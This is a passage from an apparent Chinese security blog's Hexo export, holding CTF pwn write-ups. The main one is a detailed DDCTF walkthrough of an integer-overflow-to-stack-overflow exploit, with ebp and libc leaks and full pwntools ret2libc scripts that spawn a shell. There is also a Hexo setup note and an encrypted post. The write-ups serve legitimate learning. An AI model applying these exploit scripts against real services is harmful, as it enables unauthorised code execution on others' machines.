<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vul</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-70h]</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+60h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x60</span>uLL);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"input your name:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"hi,%s welcome to shanxi~!\n"</span>, &amp;buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单的栈溢出，64位，开头ropgadget坏了，折腾了一小会，然后exp很简单</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'pwn'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">host = <span class="string">'123.59.204.3'</span></span><br><span class="line">port = <span class="number">3333</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = process(<span class="string">"./pwn"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line">    pop_rdi = <span class="number">0x0000000000400863</span></span><br><span class="line">    puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">    puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">    ret_addr = <span class="number">0x0000000000400776</span></span><br><span class="line">    offset = <span class="number">120</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">120</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(ret_addr)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.recvuntil(<span class="string">"welcome to shanxi~!\n"</span>)</span><br><span class="line">    puts_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    io.success(<span class="string">"puts_addr: 0x%x"</span> % puts_addr)</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    bin_sh_addr = libc_base + libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">120</span> + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>二进制</category>
        <category>pwn</category>
        <category>栈</category>
      </categories>
      <tags>
        <tag>pwn， 栈</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo部署踩坑</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="hexo部署"><a href="#hexo部署" class="headerlink" title="hexo部署"></a>hexo部署</h1><h2 id="坑1"><a href="#坑1" class="headerlink" title="坑1"></a>坑1</h2><p>daovoice缓速会导致博客打开白页</p><h2 id="vscode配置"><a href="#vscode配置" class="headerlink" title="vscode配置"></a>vscode配置</h2><p>安装必要组件</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install xclip</span><br></pre></td></tr></table></figure><p>vscode装插件picgo,markdown_preview</p><p>用github做图床，自己创建项目<br>填写picgo配置里的</p><ol>
<li>Picgo › Pic Bed › Github: Branch</li>
<li>Picgo › Pic Bed › Github: Repo</li>
<li>Picgo › Pic Bed › Github: Token</li>
</ol><a id="more"></a>






<p>branch通常填master<br>repo复制过来就好<br>token在github-&gt;setting-&gt;developer settings 选择generate new token</p>
<p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/20191030230028.png" alt="20191030230028.png"></p>
]]></content>
      <categories>
        <category>linux</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>linux,hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>滴滴CTF之唯一的pwn题详解</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="滴滴CTF之唯一的pwn题详解"><a href="#滴滴CTF之唯一的pwn题详解" class="headerlink" title="滴滴CTF之唯一的pwn题详解"></a>滴滴CTF之唯一的pwn题详解</h1><p>前言：这道题比赛期间没怎么研究，第一次搞了一天没搞出，不知道什么错，然后放弃了，然后比完后，搜了一波exp后，自己具体调试了一波，懂了整个过程，有些师傅们的wp有些小瑕疵，还有就是师傅们从来不详细写简单题的writeup，导致新手很难懂exp。好了，开始正文:</p><h2 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [esp+40h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v5; <span class="comment">// [esp+44h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = &amp;a1;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  sub_80485DB(<span class="built_in">stdin</span>, <span class="built_in">stdout</span>);</span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please set the length of password: "</span>);</span><br><span class="line">  nbytes = sub_804862D();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)nbytes &gt; <span class="number">63</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Too long!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter password(lenth %u): "</span>, nbytes);</span><br><span class="line">  v1 = fileno(<span class="built_in">stdin</span>);</span><br><span class="line">  read(v1, &amp;buf, nbytes);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"All done, bye!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a>

<p><strong>sub_80485DB(stdin, stdout)内部代码</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_80485DB</span><span class="params">(FILE *stream, FILE *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-48h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter username: "</span>);</span><br><span class="line">  v2 = fileno(stream);</span><br><span class="line">  read(v2, &amp;buf, <span class="number">0x40</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">fprintf</span>(a2, <span class="string">"Hello %s"</span>, &amp;buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>sub_804862D()内部代码</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_804862D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v0 = fileno(<span class="built_in">stdin</span>);</span><br><span class="line">  read(v0, nptr, <span class="number">0x10</span>u);</span><br><span class="line">  <span class="keyword">return</span> atoi(nptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从sub_804862D()这里明显可以看出整数溢出的洞，输入-1即可，-1在32位机器上为0xffffffff,具体可以自行调试查看，转化为signed int为-1，小于63，接下来在read(v1, &amp;buf, nbytes);就可以输入很长的一串字符，看上去好像很简单对吧，整数溢出，然后接着栈溢出，ROP一波梭。。。我觉得是这样的，可是运行自己的exp起来后，发觉有很大的问题，每次都是出错<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g27zjxto4tj30m90g5adg.jpg" alt="1"><br>具体调试，你可以从</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./xpwn'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">local = <span class="literal">False</span></span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"><span class="keyword">if</span> local :</span><br><span class="line">    libc = elf.libc</span><br><span class="line">    io = process(<span class="string">'./xpwn'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">    io = remote(<span class="string">"116.85.48.105"</span>, <span class="number">5005</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">IntOverFlow</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.sendline(str(payload))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">UserName</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.sendafter(<span class="string">'Enter username: '</span>, payload)</span><br><span class="line">    io.recvuntil(payload)</span><br><span class="line">    __ebp__ = u32(io.recv(<span class="number">4</span>)) </span><br><span class="line">    setbuf = u32(io.recv(<span class="number">4</span>)) - <span class="number">21</span></span><br><span class="line">    log.success(<span class="string">"ebp: "</span> +  hex(__ebp__))</span><br><span class="line">    log.success(<span class="string">"setbuf: "</span> + hex(setbuf))</span><br><span class="line">    <span class="keyword">return</span> __ebp__, setbuf</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Passwd</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'Enter password'</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    addr = UserName(<span class="string">'a'</span>*<span class="number">0x28</span>)</span><br><span class="line">    ebp = addr[<span class="number">0</span>]</span><br><span class="line">    ecx = ebp + <span class="number">24</span></span><br><span class="line">    setbuf = addr[<span class="number">1</span>]</span><br><span class="line">    IntOverFlow(<span class="number">-1</span>)</span><br><span class="line">    puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">    libc_base = setbuf - libc.symbols[<span class="string">'setbuf'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    bin_sh = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">    <span class="comment">#payload = 'a'*0x44 + p32(ecx) + p32(0)*6 + p32(system_addr) + p32(0) + p32(bin_sh)</span></span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    Passwd(<span class="string">'a'</span>*<span class="number">0x60</span>)</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h2><ul>
<li>在具体地方附加，用gdb.attach(io)附加，然后finish 3次出到最外层，最外层的地址就是0x80开头的这种，然后单步运行，你会发觉最后出错的地方在read这里，然后read函数出错，这里我当时不知道怎么继续调试下去了，一直卡死在这，还有个小问题，我发觉第一次printf会输出一些乱码，按照往常来说，这里肯定泄露了信息，所以具体这里泄露了什么信息，就得你自己去发现了。<br>后面从大佬的wp里发觉，他说ecx不能改，然后我就去看汇编代码了，</li>
</ul>
<p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g285j7w0nhj30iz0evdh0.jpg" alt="2"></p>
<ul>
<li>发觉最后一行有点道道，你看我上一张图的错误，0x6161615d,为什么不是0x61616161呢，ecx-4,联系起来没有，刚好0x61616161-0x6161615d = 4 ,也就是说，我把ecx覆盖成错误的值了，所以就没法正确读入了，那我如何找到ecx的正确位置呢,这时候就运用gdb了<br>我直接将Passwd(‘a’*0x60)这句注释掉，然后python运行这个脚本，然后用<br>gdb-peda$ pattern_create 200<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287zdxr09j30m70f0tb5.jpg" alt="10"><br>创建一串字符，然后复制，然后<br>gdb-peda$ c<br>在打开的另一个终端里输入这串字符<br>然后获得这张图<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287zjk9y0j30md0c6dhf.jpg" alt="11"><br>Program received signal SIGSEGV (fault address 0x4141333d)<br>有这句话<br>然后复制这个address<br>0x4141333d,在将他+4，为什么要加4呢，因为我们刚刚那里ecx-了个4<br>所以变成0x41413341<br>gdb-peda$ pattern_offset 0x41413341<br>获得偏移，1094792001 found at offset: 68</li>
</ul>
<h2 id="定点泄露"><a href="#定点泄露" class="headerlink" title="定点泄露"></a>定点泄露</h2><p>68个偏移，好了，知道错误在哪了，如何泄露ecx？关键点来了，还记得刚开始的printf输出的乱码吗，这里肯定有泄露信息，从ida里我看不出什么东西，所以，gdb也调试一波了</p>
<p>你可以直接gdb filename 或者 gdb 启动后在file加载都行，</p>
<p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g285op2bscj30m70f9n1g.jpg" alt="3"></p>
<p>然后输入start开始，这时候你们的界面可能跟我不太一样，因为我装了插件，peda和pwndbg</p>
<p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g285sjp1qej31bd0qb13z.jpg" alt="4"></p>
<p>单步输入n 走到push ecx这里，因为我需要的是ecx，和ebp,为什么需要ebp呢，因为知道ebp我在知道偏移，整个栈的位置都知道了，所以我需要把这里的数据记录下来，可以看到，寄存器里存的值</p>
<p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287w3uv2jj30qt0l6tdz.jpg" alt="12"></p>
<p>ecx 0xffffd160<br>ebp 0xffffd148<br>然后我需要继续运行软件，到我应该栈溢出的地方，这时候先下个断，<br>gdb$ b read<br>在read函数处下断，然后再<br>gdb$ c</p>
<p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287we3ahoj30m80ekte2.jpg" alt="5"></p>
<p>这时候会在read函数处断下，不担心，输入finish<br>gdb$ finish<br>然后让你输入名字，直接回车，这时候继续单步，单步就是输入n(next)<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287wmw6ocj30vs0ok47n.jpg" alt="13"></p>
<p>在fprintf这里停下，看地址，取出0xffffd090<br>然后<br>gdb$ x/20wx 0xffffd090<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287wt79m9j30kz03vaac.jpg" alt="14"></p>
<p>好了，我看到关键点了，0xffffd148,在第三行第三列里，也就是ebp的值，也就是说，我们需要输入10个4字节就可以到这个地方，还有，你看ebp后面的地址，0xf7e2c935，这里是不是很像libc函数的地址，这里我为什么说像呢，从上面我看寄存器那张图里可以看到__libc_start_main+241的地址，他就是这个类型的。</p>
<p>所以，我输出一下这里的地址看看内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/wx 0xf7e2c935</span><br><span class="line">0xf7e2c935 &lt;setbuf+21&gt;:	0xc31cc483</span><br></pre></td></tr></table></figure>
<p>果真如此，setbuf的地址我们也拿到了，一次性泄露了ebp和setbuf+21的地址，所以这时候怎么获得ecx的值呢，这里你就想每次栈的相对位置会变吗，不会的，所以，开局ebp和ecx的地址相差也不会变，所以我就用ebp和ecx的偏差<br>ecx 0xffffd160<br>ebp 0xffffd148<br>ecx - ebp = 0x18<br>所以ebp+0x18就是ecx了，找到ecx了，也找到setbuf地址了，现在便剩下</p>
<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>payload = ‘a’*0x44 + p32(ecx)+p32(system_addr)+p32(0) + p32(bin_sh)<br>按理说payload这样就行了，先填充位置，在填充ecx，在返回地址就完美了，运行下试试<br>这里我不告诉你们具体怎么做了，因为都是运行我刚刚讲的几条命令，finish,c，n,</p>
<p><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287x3g3l0j30ss0mh0zp.jpg" alt="15"></p>
<p>看这里esp指向了我的system,也就是说我还没到返回地址，还有你看最后一步，他还会通过ecx-4改掉esp,所以还没到重点，所以很明显，我还要将两个pop填充掉，也就是得弄两个空的给他<br>payload = ‘a’<em>0x44 + p32(ecx)+ p32(0) * 2 + p32(system_addr)+p32(0) + p32(bin_sh)<br>这样下去可以填充掉那部分，还有个他改了esp的地址，看他修改了多少偏移<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287x8ni0fj30rg0l6jwz.jpg" alt="16"><br>从图中可以看出esp跟ecp差了4个偏移，也就是4</em>4=16大小<br>所以我们可以<br>payload = ‘a’*0x44 + p32(ecx-16)+ p32(0) * 2 + p32(system_addr)+p32(0) + p32(bin_sh)<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g287xdxivlj30mr06x75l.jpg" alt="17"><br>yes,成功</p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>现在从整体上来分析下过程，先利用printf泄露ebp和setbuf+21地址，然后利用ebp和ecx的固定偏移计算出ecx,然后定点覆盖到ecx具体地址，定位ret的位置，然后进行payload构造，最后成功ROP<br>附上最后的exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./xpwn'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">local = <span class="literal">False</span></span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"><span class="keyword">if</span> local :</span><br><span class="line">    libc = elf.libc</span><br><span class="line">    io = process(<span class="string">'./xpwn'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">    io = remote(<span class="string">"116.85.48.105"</span>, <span class="number">5005</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">IntOverFlow</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.sendline(str(payload))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">UserName</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.sendafter(<span class="string">'Enter username: '</span>, payload)</span><br><span class="line">    io.recvuntil(payload)</span><br><span class="line">    __ebp__ = u32(io.recv(<span class="number">4</span>)) </span><br><span class="line">    setbuf = u32(io.recv(<span class="number">4</span>)) - <span class="number">21</span></span><br><span class="line">    log.success(<span class="string">"ebp: "</span> +  hex(__ebp__))</span><br><span class="line">    log.success(<span class="string">"setbuf: "</span> + hex(setbuf))</span><br><span class="line">    <span class="keyword">return</span> __ebp__, setbuf</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Passwd</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'Enter password'</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    addr = UserName(<span class="string">'a'</span>*<span class="number">0x28</span>)</span><br><span class="line">    ebp = addr[<span class="number">0</span>]</span><br><span class="line">    ecx = ebp + <span class="number">24</span></span><br><span class="line">    setbuf = addr[<span class="number">1</span>]</span><br><span class="line">    IntOverFlow(<span class="number">-1</span>)</span><br><span class="line">    puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">    libc_base = setbuf - libc.symbols[<span class="string">'setbuf'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    bin_sh = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x44</span> + p32(ecx<span class="number">-16</span>) + p32(<span class="number">0</span>)*<span class="number">2</span> + p32(system_addr)+p32(<span class="number">0</span>) + p32(bin_sh)</span><br><span class="line">    Passwd(payload)</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>



<p><strong>总结：</strong></p>
<ul>
<li>这道题其实不难，难的是大部分要调试，调试部分的话，我写的也7,8成了，具体就靠你们自己慢慢去调试了，关键还是要看清栈的结构，知道他的位置，其余就是基本的ROP了,</li>
<li>虽然题目不难，但我光调试花了好长时间，最主要还是没了解还可以这么玩，学到了师傅们的姿势，谢谢ddctf，谢谢大佬们的writeup</li>
<li>如果还有什么不懂了，可以下方留言</li>
</ul>
]]></content>
      <categories>
        <category>二进制</category>
        <category>pwn</category>
        <category>stack</category>
      </categories>
      <tags>
        <tag>pwn， 二进制</tag>
        <tag>栈</tag>
      </tags>
  </entry>
  <entry>
    <title>360杯pwn部分题解</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="请输入密码以阅读这篇私密文章。" />
    <label for="hbePass">请输入密码以阅读这篇私密文章。</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="c5f04d8ccbb2c8fed46cc34974e77ac991fe0349e2c649f8ae9efa653b06a491">6e5a12e0ff795b1d0bf9b0904e647e0c013dcf5051fc09720a483386b4ddd149054af309b6744d95fca136159c0415c3e2580a8189d545fb4b68ef9ef4a57fc4f03fd9f4c81661d42be92a72b844554288a24f18dc81cf0fbf1d103e0157feca7d2896f181aa234f7b602f6b0ce96478e61aa46f482770b1eb44fcbe62d68dddc0c27f7a61a62e2933d7fd0add4c139fdf1f119cf66c3acce84865377c32ccbd20678cd1141bfca4cfd4e7f3c77265e7ef265e72d70a4bd26d6cecb6ff64cefe1bb5c110481149f2cb04edf0305654744dc2a8b18abb78b768f4af424019d6de1bb28f39b410937637931087683ad1819df964e2281133f00b0cb94a7f038cfa0b99041be4d9c007b4ce656a6920796a65e0833aa23053eaf98440b9b5c290ef1105a10e9a8b29abe345022eb40c9f5b54137df922f550bf80bcdab6f9961143552491a91caa932f82510fec93bd3f65e91fd9510ea1ab8a7b4735ca679961c140ef4b10a926b5fce794cd1ba8d74ddb172299b1ef378f51e96f5ae68ac39801e9471f2534e9283ed8f517c06388e0890488c00acef3bd82ec3cc793e2e39c85e4d15f68174a6a74b8d976ab692ca2c0bcbb6dc6f26a1fdff79f9beecc2e58dcbf486da9678b9eeea7838852047097170a64a133915e621fbc7c962165b017eee6faf979046d471cc91f7e80ea37a0e2a0e2c4c9a35438ecb33d358943f8187e6e4e522ca0676205670efcd498ab91448c51dd0b89b46d8084b2dc6a9b917e039485e1dea43f896df25c9489a54031d7a74ba208b7ca97ce3d8559a7b39baef0534f0cf70fc382e0006e598ba1e435d1cc7b8d3454ae17675c4f8d29533475b2f5d99a0b66fd8f99bb7563879f1cbf29eecaba27fdab2e12b3d5e5e3a57eb8cf0cde581a380eac7b7990d61646bc3c37a20b613b551895528cd12d8ece587bde67291b88c83c4373b34f5a6c825cefa94d2e16017c469c7576ce33ed65fd91aff1868986008b4f22bfad1df29c04559c98d0dc68edddbdc370dc17e857925b86c43a13344c0b679d6bc23859e977d4423921c8718427569773ac27181910acc7d754ed472cc8899a2d8dc3666735dd4900659d13403f14d5f17ff77c77501cabc2b10e65977f506d060b3cbba89e69cdbb1cb9be69a5a391885b9d3dd4c22f293785430abf240bfcd0bbfea3301e40d04371d9931c70993c2ffa22d590a2fc8035dcc0db3fc3f18b830886e091501429ff3c5082ac1ccc32eb82e1835ca66931b7792f697ce00706f67382ee154a2c650635e492bd94a011738b381bafbe26215248057a38da19180b26f61c6d1e91fc18619b70df422d85d8457a0326dcbf96acc9b0262bf73156a9683cf0eaddcac460738acc629a20b6f35c8279e5053514ed138446386838928d1ac415d06e239b0cfeea03b540c68ce52c319f905eb0434740331edba2691736cc5c8036fb3d0c519532b9ad0888b0b849b90f1e9319ff4058cb5459066921ce74a24a64047ce8e174424ce239d1de8212b3f47040580595d3755ac753979dc9b8b663ca8a352162dbc651237be69e2db33f2e410d10f7829f4a307d32c42e483a0d63973b6f30f554274973078276960f8f0db9201bdd80c33875d11a77a422ed9d5c720be69189877d3b0bc69e0ae4cf46871a34e26ff8d7870bbb936eb864e1be1b49df19bc554bca35902fc6f7f0ed0cf0de7df975ce9402437b2a4e86734ca24ef92f1ab80bc8b6306fd86d304071c5197fc0e3afc61ad4768a6123a2297de305fc7d21939f6127fb3fbd5c5533ef3dae326cc92177d8e7b4ea72566c30c5a99b06590b81e76f211cd9d92ee36ec60e35a612bec93677da711128c2710ee0ae5d213253a43da07e801d7431674697039bf79cd4bd306157954839dc95034ac07d02e29f8f2bc390af22648a4bafdb17354a9ccac8cfceeda5dcbf56114aca9594c1f8e71aa383ac0661f9514962dbf11eca911c15dccba60aa177eefdc131c6abc8032b2fc65a523da3f2b07951332935060f6ae976d589f4e4ced57cf0fcb7d576fea2ea5f5b7e35f209b955289a2e6a3ea7fe941dd7d6231a4610b5ea5de9309e972c75601711a31c13f8d2e87e93e1bb76993a315e19477cee6c7f1273c0c33734b0e7c8124e5fd33faf46fd62f1967fe5272fd502db081fde2de194a78b6eeaf598d17721bfa4bb4f9bdb6b22699abdff3abf638130adbfbe0adac436cadf673c5c08952ecb627d89fa96ebdd77f41df607b8404e4a3b141160dd8960971b2b167eca54859471ee72bd76a167097259003f870b331d244a72d638bfec18f85fb42b111366dab315408f5fbd4d53b1bb1bd54d834ab7a759aa0ccbebdefc2cdbb381adf79837509ec7792288ac3d57dd3459db4ab212c7d44cbb5ce70059c964b08e83611c69c77f4a811066479e4ac11835e738943071ce58b1938f0166b7ed081e1bbdf9a4786d01b8fb0603911fc2287781aea18e4000dfd46679f885677d335b6e9ba25cece8680dee4159e148c412f1fe987606c9b75f94cb7ace1468cb306be6aade9cedd261628189b173bd9bd87b7beec4cc373d434aee762bad7db0ac63ef973bf1c88dde4071e57505a47514ca18897395e74b9770a4afc879f8abaf10910c43d1d39cb358d5fb634940ba881d58539c40cf6d2c49f5a0cf609020e8780eff5d221b6ea89f2d7aaa07e9ff092ce51b74b998d095253810c8ccb1d57c7d20b62b5549e24f1fd2abcf0aab3b009585b24233707f81c5527c1c06668a5fe9d80250e19ec043507c54099a18943384a4c2cd65b6f4b5aedb5dcd825537e8adbd832b475ff0f18f71971577d2fd780c879ed047181217a5f2242c40a0631c06e9988e2a2820fccb070dd7ca57e45baeb75ccbddf1e153dca62caa27fbec2bf526613c551957bdad1b4d404cde876d5f0a7ad3199220eaac53d877f6eae5cf447fab48c969ff8fdbe20d4ad9a33072bebab051d0dd5a59072687e6eaf40231971da81732cffee831574d1710d6973d6e942ceffd6bb42916bc253068d72c00345a413811018e91a28b001440338618b81e9f00e814047594643c29191ac82ddb1b319a9845299e3c4a0876565cff40e408bcaf9a6efa454cfba74bbac3f64907eba37f3f162aea2856d996aaf29d5086dc63cad1c4517861578f69bd13952fb983344ab2d1885ec802b62828e0e21d4852ae0e1aec50403c582310ad3ab937ec55d78ba9b3350092ee9da747b45add027dd58f459648b02fd97abbfd9197cf49df7fe04a39d6dbabb013fb451cad07f55f1d5272c913683a0eb7145ee790e2eb21f99122e69ff16f8793475ae05487eaceacb3cf71e4cea7a65ffd1db414c155b21453eae71c0a5db7de9f847b9ce53dd8beed8999bee76dd364a201d8d5cfc1db22489c179c378c5343a0b6894889fc8821ab50f08b91153a867cf01abc420d767de5d79c889c9659bb338ee355b86b6ec165176dc463157efb2c690c40f849714dc7355d337ae3869c8227f0f972889a7f0d94f33fd35d9bd72f5ba7ee2e19e60a5d4071548021f42166c47699591bac8124afcbf1f3e0517a1e7be648adc16271ceca3e4fdf2f31fb75a009aa6c599c621edf27217031f0bfc40e5755fe6fb6e1eef2b7f20c1c07d11782d236489a76aa8b334495ca4a88047910adaf95da77e6040ab85e8e12feb3e39c5fbbae06f706d382129645ae399c6408a3590ca2a530ef926e500b82fde7c8bfff2399103fd12480cd53524497ddb532942b94c2c4cc45992c1da0732f91e53775ffda0f774e4398b7545c86f1ef091566a4bac4413061689a